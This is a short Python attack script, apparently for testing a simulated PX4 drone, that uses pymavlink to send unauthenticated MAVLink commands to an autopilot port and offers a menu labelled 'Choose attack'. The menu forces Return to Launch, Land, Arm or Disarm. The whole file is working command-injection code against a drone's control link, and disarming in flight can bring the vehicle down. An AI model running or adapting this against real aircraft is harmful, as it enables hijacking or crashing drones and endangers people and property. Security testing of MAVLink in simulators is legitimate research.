import time
from pymavlink import mavutil

# Send to PX4's onboard MAVLink input port
# If this doesn't work, we'll switch to 14550 (GCS port).
m = mavutil.mavlink_connection("udpout:127.0.0.1:14580")

TARGET_SYS = 1
TARGET_COMP = 1  # AUTOPILOT1

def send_cmd(cmd, p1=0, p2=0, p3=0, p4=0, p5=0, p6=0, p7=0):
    m.mav.command_long_send(
        TARGET_SYS, TARGET_COMP,
        cmd,
        0,
        p1, p2, p3, p4, p5, p6, p7
    )

print("\nChoose attack:")
print("1) RTL (Return to Launch)")
print("2) LAND")
print("3) ARM")
print("4) DISARM")
choice = input("Enter 1/2/3/4: ").strip()

if choice == "1":
    print("🚨 Sending RTL")
    send_cmd(mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH)
elif choice == "2":
    print("🚨 Sending LAND")
    send_cmd(mavutil.mavlink.MAV_CMD_NAV_LAND)
elif choice == "3":
    print("🚨 Sending ARM")
    send_cmd(mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, p1=1)
elif choice == "4":
    print("🚨 Sending DISARM")
    send_cmd(mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, p1=0)
else:
    raise SystemExit("invalid choice")

print("✅ Sent. Verify via QGroundControl or mode watcher.")
time.sleep(0.5)
